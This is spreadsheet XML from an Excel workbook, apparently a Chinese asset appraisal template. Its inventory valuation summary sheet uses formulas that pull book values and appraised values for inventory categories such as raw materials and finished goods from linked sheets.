      <c r="H64" s="347" t="n"/>
      <c r="I64" s="347" t="n"/>
      <c r="J64" s="347" t="n"/>
      <c r="K64" s="347" t="n"/>
      <c r="L64" s="347" t="n"/>
      <c r="M64" s="347" t="n"/>
      <c r="N64" s="347" t="n"/>
      <c r="O64" s="347" t="n"/>
      <c r="P64" s="347" t="n"/>
      <c r="Q64" s="322" t="n"/>
    </row>
    <row r="65" s="415">
      <c r="A65" s="347" t="n"/>
      <c r="B65" s="347" t="n"/>
      <c r="C65" s="347" t="n"/>
      <c r="D65" s="347" t="n"/>
      <c r="E65" s="347" t="n"/>
      <c r="F65" s="347" t="n"/>
      <c r="G65" s="347" t="n"/>
      <c r="H65" s="347" t="n"/>
      <c r="I65" s="347" t="n"/>
      <c r="J65" s="347" t="n"/>
      <c r="K65" s="347" t="n"/>
      <c r="L65" s="347" t="n"/>
      <c r="M65" s="347" t="n"/>
      <c r="N65" s="347" t="n"/>
      <c r="O65" s="347" t="n"/>
      <c r="P65" s="347" t="n"/>
      <c r="Q65" s="322" t="n"/>
    </row>
    <row r="66" s="415">
      <c r="A66" s="347" t="n"/>
      <c r="B66" s="347" t="n"/>
      <c r="C66" s="347" t="n"/>
      <c r="D66" s="347" t="n"/>
      <c r="E66" s="347" t="n"/>
      <c r="F66" s="347" t="n"/>
      <c r="G66" s="347" t="n"/>
      <c r="H66" s="347" t="n"/>
      <c r="I66" s="347" t="n"/>
      <c r="J66" s="347" t="n"/>
      <c r="K66" s="347" t="n"/>
      <c r="L66" s="347" t="n"/>
      <c r="M66" s="347" t="n"/>
      <c r="N66" s="347" t="n"/>
      <c r="O66" s="347" t="n"/>
      <c r="P66" s="347" t="n"/>
      <c r="Q66" s="322" t="n"/>
    </row>
    <row r="67" s="415">
      <c r="A67" s="347" t="n"/>
      <c r="B67" s="347" t="n"/>
      <c r="C67" s="347" t="n"/>
      <c r="D67" s="347" t="n"/>
      <c r="E67" s="347" t="n"/>
      <c r="F67" s="347" t="n"/>
      <c r="G67" s="347" t="n"/>
      <c r="H67" s="347" t="n"/>
      <c r="I67" s="347" t="n"/>
      <c r="J67" s="347" t="n"/>
      <c r="K67" s="347" t="n"/>
      <c r="L67" s="347" t="n"/>
      <c r="M67" s="347" t="n"/>
      <c r="N67" s="347" t="n"/>
      <c r="O67" s="347" t="n"/>
      <c r="P67" s="347" t="n"/>
      <c r="Q67" s="322" t="n"/>
    </row>
    <row r="68" s="415">
      <c r="A68" s="347" t="n"/>
      <c r="B68" s="347" t="n"/>
      <c r="C68" s="347" t="n"/>
      <c r="D68" s="347" t="n"/>
      <c r="E68" s="347" t="n"/>
      <c r="F68" s="347" t="n"/>
      <c r="G68" s="347" t="n"/>
      <c r="H68" s="347" t="n"/>
      <c r="I68" s="347" t="n"/>
      <c r="J68" s="347" t="n"/>
      <c r="K68" s="347" t="n"/>
      <c r="L68" s="347" t="n"/>
      <c r="M68" s="347" t="n"/>
      <c r="N68" s="347" t="n"/>
      <c r="O68" s="347" t="n"/>
      <c r="P68" s="347" t="n"/>
      <c r="Q68" s="322" t="n"/>
    </row>
    <row r="69" s="415">
      <c r="A69" s="341" t="n"/>
      <c r="B69" s="341" t="n"/>
      <c r="C69" s="341" t="n"/>
      <c r="D69" s="341" t="n"/>
      <c r="E69" s="341" t="n"/>
      <c r="F69" s="341" t="n"/>
      <c r="G69" s="341" t="n"/>
      <c r="H69" s="341" t="n"/>
      <c r="I69" s="341" t="n"/>
      <c r="J69" s="341" t="n"/>
      <c r="K69" s="341" t="n"/>
      <c r="L69" s="341" t="n"/>
      <c r="M69" s="341" t="n"/>
      <c r="N69" s="341" t="n"/>
      <c r="O69" s="341" t="n"/>
      <c r="P69" s="341" t="n"/>
      <c r="Q69" s="322" t="n"/>
    </row>
    <row r="70" s="415">
      <c r="A70" s="341" t="n"/>
      <c r="B70" s="341" t="n"/>
      <c r="C70" s="341" t="n"/>
      <c r="D70" s="341" t="n"/>
      <c r="E70" s="341" t="n"/>
      <c r="F70" s="341" t="n"/>
      <c r="G70" s="341" t="n"/>
      <c r="H70" s="341" t="n"/>
      <c r="I70" s="341" t="n"/>
      <c r="J70" s="341" t="n"/>
      <c r="K70" s="341" t="n"/>
      <c r="L70" s="341" t="n"/>
      <c r="M70" s="341" t="n"/>
      <c r="N70" s="341" t="n"/>
      <c r="O70" s="341" t="n"/>
      <c r="P70" s="341" t="n"/>
      <c r="Q70" s="322" t="n"/>
    </row>
    <row r="71" s="415">
      <c r="A71" s="341" t="n"/>
      <c r="B71" s="341" t="n"/>
      <c r="C71" s="341" t="n"/>
      <c r="D71" s="341" t="n"/>
      <c r="E71" s="341" t="n"/>
      <c r="F71" s="341" t="n"/>
      <c r="G71" s="341" t="n"/>
      <c r="H71" s="341" t="n"/>
      <c r="I71" s="341" t="n"/>
      <c r="J71" s="341" t="n"/>
      <c r="K71" s="341" t="n"/>
      <c r="L71" s="341" t="n"/>
      <c r="M71" s="341" t="n"/>
      <c r="N71" s="341" t="n"/>
      <c r="O71" s="341" t="n"/>
      <c r="P71" s="341" t="n"/>
      <c r="Q71" s="322" t="n"/>
    </row>
    <row r="72" s="415">
      <c r="A72" s="341" t="n"/>
      <c r="B72" s="341" t="n"/>
      <c r="C72" s="341" t="n"/>
      <c r="D72" s="341" t="n"/>
      <c r="E72" s="341" t="n"/>
      <c r="F72" s="341" t="n"/>
      <c r="G72" s="341" t="n"/>
      <c r="H72" s="341" t="n"/>
      <c r="I72" s="341" t="n"/>
      <c r="J72" s="341" t="n"/>
      <c r="K72" s="341" t="n"/>
      <c r="L72" s="341" t="n"/>
      <c r="M72" s="341" t="n"/>
      <c r="N72" s="341" t="n"/>
      <c r="O72" s="341" t="n"/>
      <c r="P72" s="341" t="n"/>
      <c r="Q72" s="322" t="n"/>
    </row>
    <row r="73" s="415">
      <c r="A73" s="341" t="n"/>
      <c r="B73" s="341" t="n"/>
      <c r="C73" s="341" t="n"/>
      <c r="D73" s="341" t="n"/>
      <c r="E73" s="341" t="n"/>
      <c r="F73" s="341" t="n"/>
      <c r="G73" s="341" t="n"/>
      <c r="H73" s="341" t="n"/>
      <c r="I73" s="341" t="n"/>
      <c r="J73" s="341" t="n"/>
      <c r="K73" s="341" t="n"/>
      <c r="L73" s="341" t="n"/>
      <c r="M73" s="341" t="n"/>
      <c r="N73" s="341" t="n"/>
      <c r="O73" s="341" t="n"/>
      <c r="P73" s="341" t="n"/>
      <c r="Q73" s="322" t="n"/>
    </row>
    <row r="74" s="415">
      <c r="A74" s="341" t="n"/>
      <c r="B74" s="341" t="n"/>
      <c r="C74" s="341" t="n"/>
      <c r="D74" s="341" t="n"/>
      <c r="E74" s="341" t="n"/>
      <c r="F74" s="341" t="n"/>
      <c r="G74" s="341" t="n"/>
      <c r="H74" s="341" t="n"/>
      <c r="I74" s="341" t="n"/>
      <c r="J74" s="341" t="n"/>
      <c r="K74" s="341" t="n"/>
      <c r="L74" s="341" t="n"/>
      <c r="M74" s="341" t="n"/>
      <c r="N74" s="341" t="n"/>
      <c r="O74" s="341" t="n"/>
      <c r="P74" s="341" t="n"/>
      <c r="Q74" s="322" t="n"/>
    </row>
    <row r="75" s="415">
      <c r="A75" s="342" t="n"/>
      <c r="B75" s="342" t="n"/>
      <c r="C75" s="342" t="n"/>
      <c r="D75" s="342" t="n"/>
      <c r="E75" s="342" t="n"/>
      <c r="F75" s="342" t="n"/>
      <c r="G75" s="342" t="n"/>
      <c r="H75" s="342" t="n"/>
      <c r="I75" s="342" t="n"/>
      <c r="J75" s="342" t="n"/>
      <c r="K75" s="342" t="n"/>
      <c r="L75" s="342" t="n"/>
      <c r="M75" s="342" t="n"/>
      <c r="N75" s="342" t="n"/>
      <c r="O75" s="342" t="n"/>
      <c r="P75" s="342" t="n"/>
    </row>
    <row r="76" s="415">
      <c r="A76" s="342" t="n"/>
      <c r="B76" s="342" t="n"/>
      <c r="C76" s="342" t="n"/>
      <c r="D76" s="342" t="n"/>
      <c r="E76" s="342" t="n"/>
      <c r="F76" s="342" t="n"/>
      <c r="G76" s="342" t="n"/>
      <c r="H76" s="342" t="n"/>
      <c r="I76" s="342" t="n"/>
      <c r="J76" s="342" t="n"/>
      <c r="K76" s="342" t="n"/>
      <c r="L76" s="342" t="n"/>
      <c r="M76" s="342" t="n"/>
      <c r="N76" s="342" t="n"/>
      <c r="O76" s="342" t="n"/>
      <c r="P76" s="342" t="n"/>
    </row>
    <row r="77" s="415">
      <c r="A77" s="342" t="n"/>
      <c r="B77" s="342" t="n"/>
      <c r="C77" s="342" t="n"/>
      <c r="D77" s="342" t="n"/>
      <c r="E77" s="342" t="n"/>
      <c r="F77" s="342" t="n"/>
      <c r="G77" s="342" t="n"/>
      <c r="H77" s="342" t="n"/>
      <c r="I77" s="342" t="n"/>
      <c r="J77" s="342" t="n"/>
      <c r="K77" s="342" t="n"/>
      <c r="L77" s="342" t="n"/>
      <c r="M77" s="342" t="n"/>
      <c r="N77" s="342" t="n"/>
      <c r="O77" s="342" t="n"/>
      <c r="P77" s="342" t="n"/>
    </row>
    <row r="78" s="415">
      <c r="A78" s="342" t="n"/>
      <c r="B78" s="342" t="n"/>
      <c r="C78" s="342" t="n"/>
      <c r="D78" s="342" t="n"/>
      <c r="E78" s="342" t="n"/>
      <c r="F78" s="342" t="n"/>
      <c r="G78" s="342" t="n"/>
      <c r="H78" s="342" t="n"/>
      <c r="I78" s="342" t="n"/>
      <c r="J78" s="342" t="n"/>
      <c r="K78" s="342" t="n"/>
      <c r="L78" s="342" t="n"/>
      <c r="M78" s="342" t="n"/>
      <c r="N78" s="342" t="n"/>
      <c r="O78" s="342" t="n"/>
      <c r="P78" s="342" t="n"/>
    </row>
    <row r="79" s="415">
      <c r="A79" s="342" t="n"/>
      <c r="B79" s="342" t="n"/>
      <c r="C79" s="342" t="n"/>
      <c r="D79" s="342" t="n"/>
      <c r="E79" s="342" t="n"/>
      <c r="F79" s="342" t="n"/>
      <c r="G79" s="342" t="n"/>
      <c r="H79" s="342" t="n"/>
      <c r="I79" s="342" t="n"/>
      <c r="J79" s="342" t="n"/>
      <c r="K79" s="342" t="n"/>
      <c r="L79" s="342" t="n"/>
      <c r="M79" s="342" t="n"/>
      <c r="N79" s="342" t="n"/>
      <c r="O79" s="342" t="n"/>
      <c r="P79" s="342" t="n"/>
    </row>
    <row r="80" s="415">
      <c r="A80" s="342" t="n"/>
      <c r="B80" s="342" t="n"/>
      <c r="C80" s="342" t="n"/>
      <c r="D80" s="342" t="n"/>
      <c r="E80" s="342" t="n"/>
      <c r="F80" s="342" t="n"/>
      <c r="G80" s="342" t="n"/>
      <c r="H80" s="342" t="n"/>
      <c r="I80" s="342" t="n"/>
      <c r="J80" s="342" t="n"/>
      <c r="K80" s="342" t="n"/>
      <c r="L80" s="342" t="n"/>
      <c r="M80" s="342" t="n"/>
      <c r="N80" s="342" t="n"/>
      <c r="O80" s="342" t="n"/>
      <c r="P80" s="342" t="n"/>
    </row>
    <row r="81" s="415">
      <c r="A81" s="342" t="n"/>
      <c r="B81" s="342" t="n"/>
      <c r="C81" s="342" t="n"/>
      <c r="D81" s="342" t="n"/>
      <c r="E81" s="342" t="n"/>
      <c r="F81" s="342" t="n"/>
      <c r="G81" s="342" t="n"/>
      <c r="H81" s="342" t="n"/>
      <c r="I81" s="342" t="n"/>
      <c r="J81" s="342" t="n"/>
      <c r="K81" s="342" t="n"/>
      <c r="L81" s="342" t="n"/>
      <c r="M81" s="342" t="n"/>
      <c r="N81" s="342" t="n"/>
      <c r="O81" s="342" t="n"/>
      <c r="P81" s="342" t="n"/>
    </row>
    <row r="82" s="415">
      <c r="A82" s="342" t="n"/>
      <c r="B82" s="342" t="n"/>
      <c r="C82" s="342" t="n"/>
      <c r="D82" s="342" t="n"/>
      <c r="E82" s="342" t="n"/>
      <c r="F82" s="342" t="n"/>
      <c r="G82" s="342" t="n"/>
      <c r="H82" s="342" t="n"/>
      <c r="I82" s="342" t="n"/>
      <c r="J82" s="342" t="n"/>
      <c r="K82" s="342" t="n"/>
      <c r="L82" s="342" t="n"/>
      <c r="M82" s="342" t="n"/>
      <c r="N82" s="342" t="n"/>
      <c r="O82" s="342" t="n"/>
      <c r="P82" s="342" t="n"/>
    </row>
    <row r="83" s="415">
      <c r="A83" s="342" t="n"/>
      <c r="B83" s="342" t="n"/>
      <c r="C83" s="342" t="n"/>
      <c r="D83" s="342" t="n"/>
      <c r="E83" s="342" t="n"/>
      <c r="F83" s="342" t="n"/>
      <c r="G83" s="342" t="n"/>
      <c r="H83" s="342" t="n"/>
      <c r="I83" s="342" t="n"/>
      <c r="J83" s="342" t="n"/>
      <c r="K83" s="342" t="n"/>
      <c r="L83" s="342" t="n"/>
      <c r="M83" s="342" t="n"/>
      <c r="N83" s="342" t="n"/>
      <c r="O83" s="342" t="n"/>
      <c r="P83" s="342" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="E26:G26"/>
    <mergeCell ref="A2:G2"/>
    <mergeCell ref="A4:D4"/>
    <mergeCell ref="A1:G1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28.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet110">
    <tabColor rgb="FF7030A0"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:S82"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="E5" sqref="E5"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="6.83333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col hidden="1" width="14.1666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="19.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col outlineLevel="1" width="19.1666666666667" customWidth="1" style="410" min="4" max="5"/>
    <col width="19.1666666666667" customWidth="1" style="410" min="6" max="9"/>
    <col width="9" customWidth="1" style="410" min="10" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="371" t="inlineStr">
        <is>
          <t>存货评估汇总表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="16.5" customHeight="1" s="415">
      <c r="A2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
      <c r="J2" s="376" t="n"/>
      <c r="K2" s="376" t="n"/>
      <c r="L2" s="376" t="n"/>
      <c r="M2" s="376" t="n"/>
      <c r="N2" s="376" t="n"/>
      <c r="O2" s="376" t="n"/>
      <c r="P2" s="376" t="n"/>
      <c r="Q2" s="376" t="n"/>
      <c r="R2" s="376" t="n"/>
    </row>
    <row r="3" ht="16.5" customHeight="1" s="415">
      <c r="A3" s="547" t="n"/>
      <c r="B3" s="547" t="n"/>
      <c r="C3" s="547" t="n"/>
      <c r="D3" s="547" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="547" t="n"/>
      <c r="G3" s="547" t="n"/>
      <c r="H3" s="547" t="n"/>
      <c r="I3" s="548" t="inlineStr">
        <is>
          <t>表3-9</t>
        </is>
      </c>
      <c r="J3" s="376" t="n"/>
      <c r="K3" s="376" t="n"/>
      <c r="L3" s="376" t="n"/>
      <c r="M3" s="376" t="n"/>
      <c r="N3" s="376" t="n"/>
      <c r="O3" s="376" t="n"/>
      <c r="P3" s="376" t="n"/>
      <c r="Q3" s="376" t="n"/>
      <c r="R3" s="376" t="n"/>
    </row>
    <row r="4" ht="16.5" customHeight="1" s="415">
      <c r="A4" s="571">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="B4" s="571" t="n"/>
      <c r="C4" s="571" t="n"/>
      <c r="D4" s="563" t="n"/>
      <c r="E4" s="563" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="376" t="n"/>
      <c r="I4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
      <c r="J4" s="376" t="n"/>
      <c r="K4" s="376" t="n"/>
      <c r="L4" s="376" t="n"/>
      <c r="M4" s="376" t="n"/>
      <c r="N4" s="376" t="n"/>
      <c r="O4" s="376" t="n"/>
      <c r="P4" s="376" t="n"/>
      <c r="Q4" s="376" t="n"/>
      <c r="R4" s="376" t="n"/>
    </row>
    <row r="5" ht="23.25" customFormat="1" customHeight="1" s="290">
      <c r="A5" s="284" t="inlineStr">
        <is>
          <t>编号</t>
        </is>
      </c>
      <c r="B5" s="185" t="inlineStr">
        <is>
          <t>项目编号</t>
        </is>
      </c>
      <c r="C5" s="284" t="inlineStr">
        <is>
          <t>科目名称</t>
        </is>
      </c>
      <c r="D5" s="323" t="inlineStr">
        <is>
          <t>账面余额</t>
        </is>
      </c>
      <c r="E5" s="323" t="inlineStr">
        <is>
          <t>存货跌价准备</t>
        </is>
      </c>
      <c r="F5" s="284" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="G5" s="284" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="H5" s="170" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="I5" s="284" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c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292" t="n"/>
    </row>
    <row r="6" ht="17.25" customHeight="1" s="415">
      <c r="A6" s="284" t="inlineStr">
        <is>
          <t>3-9-1</t>
        </is>
      </c>
      <c r="B6" s="397" t="inlineStr">
        <is>
          <t>存货采购</t>
        </is>
      </c>
      <c r="C6" s="157" t="inlineStr">
        <is>
          <t>在途物资</t>
        </is>
      </c>
      <c r="D6" s="555">
        <f>'3-9-1在途物资'!G26</f>
        <v/>
      </c>
      <c r="E6" s="555">
        <f>'3-9-1在途物资'!G27</f>
        <v/>
      </c>
      <c r="F6" s="555">
        <f>'3-9-1在途物资'!G28</f>
        <v/>
      </c>
      <c r="G6" s="555">
        <f>'3-9-1在途物资'!J28</f>
        <v/>
      </c>
      <c r="H6" s="555">
        <f>G6-F6</f>
        <v/>
      </c>
      <c r="I6" s="555">
        <f>IF(F6=0,"",H6/F6*100)</f>
        <v/>
      </c>
      <c r="J6" s="347" t="n"/>
      <c r="K6" s="347" t="n"/>
      <c r="L6" s="347" t="n"/>
      <c r="M6" s="347" t="n"/>
      <c r="N6" s="347" t="n"/>
      <c r="O6" s="347" t="n"/>
      <c r="P6" s="347" t="n"/>
      <c r="Q6" s="347" t="n"/>
      <c r="R6" s="347" t="n"/>
      <c r="S6" s="322" t="n"/>
    </row>
    <row r="7" ht="17.25" customHeight="1" s="415">
      <c r="A7" s="284" t="inlineStr">
        <is>
          <t>3-9-2</t>
        </is>
      </c>
      <c r="B7" s="397" t="inlineStr">
        <is>
          <t>存货原材</t>
        </is>
      </c>
      <c r="C7" s="182" t="inlineStr">
        <is>
          <t>原材料</t>
        </is>
      </c>
      <c r="D7" s="555">
        <f>'3-9-2原材料'!H26</f>
        <v/>
      </c>
      <c r="E7" s="555">
        <f>'3-9-2原材料'!H27</f>
        <v/>
      </c>
      <c r="F7" s="555">
        <f>'3-9-2原材料'!H28</f>
        <v/>
      </c>
      <c r="G7" s="555">
        <f>'3-9-2原材料'!K28</f>
        <v/>
      </c>
      <c r="H7" s="555">
        <f>G7-F7</f>
        <v/>
      </c>
      <c r="I7" s="555">
        <f>IF(F7=0,"",H7/F7*100)</f>
        <v/>
      </c>
      <c r="J7" s="347" t="n"/>
      <c r="K7" s="347" t="n"/>
      <c r="L7" s="347" t="n"/>
      <c r="M7" s="347" t="n"/>
      <c r="N7" s="347" t="n"/>
      <c r="O7" s="347" t="n"/>
      <c r="P7" s="347" t="n"/>
      <c r="Q7" s="347" t="n"/>
      <c r="R7" s="347" t="n"/>
      <c r="S7" s="322" t="n"/>
    </row>
    <row r="8" ht="17.25" customHeight="1" s="415">
      <c r="A8" s="284" t="inlineStr">
        <is>
          <t>3-9-3</t>
        </is>
      </c>
      <c r="B8" s="397" t="inlineStr">
        <is>
          <t>存货在库</t>
        </is>
      </c>
      <c r="C8" s="182" t="inlineStr">
        <is>
          <t>在库周转材料</t>
        </is>
      </c>
      <c r="D8" s="555">
        <f>'3-9-3在库周转材料'!H26</f>
        <v/>
      </c>
      <c r="E8" s="555">
        <f>'3-9-3在库周转材料'!H27</f>
        <v/>
      </c>
      <c r="F8" s="555">
        <f>'3-9-3在库周转材料'!H28</f>
        <v/>
      </c>
      <c r="G8" s="555">
        <f>'3-9-3在库周转材料'!K28</f>
        <v/>
      </c>
      <c r="H8" s="555">
        <f>G8-F8</f>
        <v/>
      </c>
      <c r="I8" s="555">
        <f>IF(F8=0,"",H8/F8*100)</f>
        <v/>
      </c>
      <c r="J8" s="347" t="n"/>
      <c r="K8" s="347" t="n"/>
      <c r="L8" s="347" t="n"/>
      <c r="M8" s="347" t="n"/>
      <c r="N8" s="347" t="n"/>
      <c r="O8" s="347" t="n"/>
      <c r="P8" s="347" t="n"/>
      <c r="Q8" s="347" t="n"/>
      <c r="R8" s="347" t="n"/>
      <c r="S8" s="322" t="n"/>
    </row>
    <row r="9" ht="17.25" customHeight="1" s="415">
      <c r="A9" s="284" t="inlineStr">
        <is>
          <t>3-9-4</t>
        </is>
      </c>
      <c r="B9" s="397" t="inlineStr">
        <is>
          <t>存货委加</t>
        </is>
      </c>
      <c r="C9" s="182" t="inlineStr">
        <is>
          <t>委托加工物资</t>
        </is>
      </c>
      <c r="D9" s="555">
        <f>'3-9-4委托加工物资'!H26</f>
        <v/>
      </c>
      <c r="E9" s="555">
        <f>'3-9-4委托加工物资'!H27</f>
        <v/>
      </c>
      <c r="F9" s="555">
        <f>'3-9-4委托加工物资'!H28</f>
        <v/>
      </c>
      <c r="G9" s="555">
        <f>'3-9-4委托加工物资'!K28</f>
        <v/>
      </c>
      <c r="H9" s="555">
        <f>G9-F9</f>
        <v/>
      </c>
      <c r="I9" s="555">
        <f>IF(F9=0,"",H9/F9*100)</f>
        <v/>
      </c>
      <c r="J9" s="347" t="n"/>
      <c r="K9" s="347" t="n"/>
      <c r="L9" s="347" t="n"/>
      <c r="M9" s="347" t="n"/>
      <c r="N9" s="347" t="n"/>
      <c r="O9" s="347" t="n"/>
      <c r="P9" s="347" t="n"/>
      <c r="Q9" s="347" t="n"/>
      <c r="R9" s="347" t="n"/>
      <c r="S9" s="322" t="n"/>
    </row>
    <row r="10" ht="17.25" customHeight="1" s="415">
      <c r="A10" s="284" t="inlineStr">
        <is>
          <t>3-9-5</t>
        </is>
      </c>
      <c r="B10" s="397" t="inlineStr">
        <is>
          <t>存货产成</t>
        </is>
      </c>
      <c r="C10" s="182" t="inlineStr">
        <is>
          <t>产成品（库存商品）</t>
        </is>
      </c>
      <c r="D10" s="555">
        <f>'3-9-5产成品（库存商品）'!H26</f>
        <v/>
      </c>
      <c r="E10" s="555">
        <f>'3-9-5产成品（库存商品）'!H27</f>
        <v/>
      </c>
      <c r="F10" s="555">
        <f>'3-9-5产成品（库存商品）'!H28</f>
        <v/>
      </c>
      <c r="G10" s="555">
        <f>'3-9-5产成品（库存商品）'!L28</f>
        <v/>
      </c>
      <c r="H10" s="555">
        <f>G10-F10</f>
        <v/>
      </c>
      <c r="I10" s="555">
        <f>IF(F10=0,"",H10/F10*100)</f>
        <v/>
      </c>
      <c r="J10" s="347" t="n"/>
      <c r="K10" s="347" t="n"/>
      <c r="L10" s="347" t="n"/>
      <c r="M10" s="347" t="n"/>
      <c r="N10" s="347" t="n"/>
      <c r="O10" s="347" t="n"/>
      <c r="P10" s="347" t="n"/>
      <c r="Q10" s="347" t="n"/>
      <c r="R10" s="347" t="n"/>
      <c r="S10" s="322" t="n"/>
    </row>
    <row r="11" ht="17.25" customHeight="1" s="415">
      <c r="A11" s="284" t="inlineStr">
        <is>
          <t>3-9-6</t>
        </is>
      </c>
      <c r="B11" s="397" t="inlineStr">
        <is>
          <t>存货在产</t>
        </is>
      </c>
      <c r="C11" s="182" t="inlineStr">
        <is>
          <t>在产品（自制半成品）</t>
        </is>
      </c>
      <c r="D11" s="555">
        <f>'3-9-6在产品（自制半成品）'!H26</f>
        <v/>
      </c>
      <c r="E11" s="555">
        <f>'3-9-6在产品（自制半成品）'!H27</f>
        <v/>
      </c>
      <c r="F11" s="555">
        <f>'3-9-6在产品（自制半成品）'!H28</f>
        <v/>
      </c>
      <c r="G11" s="555">
        <f>'3-9-6在产品（自制半成品）'!K28</f>
        <v/>
      </c>
      <c r="H11" s="555">
        <f>G11-F11</f>
        <v/>
      </c>
      <c r="I11" s="555">
        <f>IF(F11=0,"",H11/F11*100)</f>
        <v/>
      </c>
      <c r="J11" s="347" t="n"/>
      <c r="K11" s="347" t="n"/>
      <c r="L11" s="347" t="n"/>
      <c r="M11" s="347" t="n"/>
      <c r="N11" s="347" t="n"/>
      <c r="O11" s="347" t="n"/>
      <c r="P11" s="347" t="n"/>
      <c r="Q11" s="347" t="n"/>
      <c r="R11" s="347" t="n"/>
      <c r="S11" s="322" t="n"/>
    </row>
    <row r="12" ht="17.25" customHeight="1" s="415">
      <c r="A12" s="284" t="inlineStr">
        <is>
          <t>3-9-7</t>
        </is>
      </c>
      <c r="B12" s="397" t="inlineStr">
        <is>
          <t>存货发出</t>
        </is>
      </c>
      <c r="C12" s="182" t="inlineStr">
        <is>
          <t>发出商品</t>
        </is>
      </c>
      <c r="D12" s="555">
        <f>'3-9-7发出商品'!H26</f>
        <v/>
      </c>
      <c r="E12" s="555">
        <f>'3-9-7发出商品'!H27</f>
        <v/>
      </c>
      <c r="F12" s="555">
        <f>'3-9-7发出商品'!H28</f>
        <v/>
      </c>
      <c r="G12" s="555">
        <f>'3-9-7发出商品'!K28</f>
        <v/>
      </c>
      <c r="H12" s="555">
        <f>G12-F12</f>
        <v/>
      </c>
      <c r="I12" s="555">
        <f>IF(F12=0,"",H12/F12*100)</f>
        <v/>
      </c>
      <c r="J12" s="347" t="n"/>
      <c r="K12" s="347" t="n"/>
      <c r="L12" s="347" t="n"/>
      <c r="M12" s="347" t="n"/>
      <c r="N12" s="347" t="n"/>
      <c r="O12" s="347" t="n"/>
      <c r="P12" s="347" t="n"/>
      <c r="Q12" s="347" t="n"/>
      <c r="R12" s="347" t="n"/>
      <c r="S12" s="322" t="n"/>
    </row>
    <row r="13" ht="17.25" customHeight="1" s="415">
      <c r="A13" s="284" t="inlineStr">
        <is>
          <t>3-9-8</t>
        </is>
      </c>
      <c r="B13" s="397" t="inlineStr">
        <is>
          <t>存货在用</t>
        </is>
      </c>
      <c r="C13" s="182" t="inlineStr">
        <is>
          <t>在用周转材料</t>
        </is>
      </c>
      <c r="D13" s="555">
        <f>'3-9-8在用周转材料'!H26</f>
        <v/>
      </c>
      <c r="E13" s="555">
        <f>'3-9-8在用周转材料'!H27</f>
        <v/>
      </c>
      <c r="F13" s="555">
        <f>'3-9-8在用周转材料'!H28</f>
        <v/>
      </c>
      <c r="G13" s="555">
        <f>'3-9-8在用周转材料'!L28</f>
        <v/>
      </c>
      <c r="H13" s="555">
        <f>G13-F13</f>
        <v/>
      </c>
      <c r="I13" s="555">
        <f>IF(F13=0,"",H13/F13*100)</f>
        <v/>
      </c>
      <c r="J13" s="347" t="n"/>
      <c r="K13" s="347" t="n"/>
      <c r="L13" s="347" t="n"/>
      <c r="M13" s="347" t="n"/>
      <c r="N13" s="347" t="n"/>
      <c r="O13" s="347" t="n"/>
      <c r="P13" s="347" t="n"/>
      <c r="Q13" s="347" t="n"/>
      <c r="R13" s="347" t="n"/>
      <c r="S13" s="322" t="n"/>
    </row>
    <row r="14" ht="17.25" customFormat="1" customHeight="1" s="410">
      <c r="A14" s="284" t="inlineStr">
        <is>
          <t>3-9-9</t>
        </is>
      </c>
      <c r="B14" s="91" t="inlineStr">
        <is>
          <t>存货履约</t>
        </is>
      </c>
      <c r="C14" s="157" t="inlineStr">
        <is>
          <t>合同履约成本</t>
        </is>
      </c>
      <c r="D14" s="555">
        <f>'3-9-9合同履约成本'!E26</f>
        <v/>
      </c>
      <c r="E14" s="555">
        <f>'3-9-9合同履约成本'!E27</f>
        <v/>
      </c>
      <c r="F14" s="591">
        <f>'3-9-9合同履约成本'!E28</f>
        <v/>
      </c>
      <c r="G14" s="591">
        <f>'3-9-9合同履约成本'!F28</f>
        <v/>
      </c>
      <c r="H14" s="591">
        <f>G14-F14</f>
        <v/>
      </c>
      <c r="I14" s="591">
        <f>IF(F14=0,"",H14/F14*100)</f>
        <v/>
      </c>
      <c r="J14" s="340" t="n"/>
      <c r="K14" s="347" t="n"/>
      <c r="L14" s="347" t="n"/>
      <c r="M14" s="347" t="n"/>
      <c r="N14" s="347" t="n"/>
      <c r="O14" s="347" t="n"/>
      <c r="P14" s="347" t="n"/>
      <c r="Q14" s="347" t="n"/>
      <c r="R14" s="347" t="n"/>
      <c r="S14" s="322" t="n"/>
    </row>
    <row r="15" ht="17.25" customHeight="1" s="415">
      <c r="A15" s="284" t="n"/>
      <c r="B15" s="397" t="n"/>
      <c r="C15" s="327" t="n"/>
      <c r="D15" s="327" t="n"/>
      <c r="E15" s="327" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="347" t="n"/>
      <c r="K15" s="347" t="n"/>
      <c r="L15" s="347" t="n"/>
      <c r="M15" s="347" t="n"/>
      <c r="N15" s="347" t="n"/>
      <c r="O15" s="347" t="n"/>
      <c r="P15" s="347" t="n"/>
      <c r="Q15" s="347" t="n"/>
      <c r="R15" s="347" t="n"/>
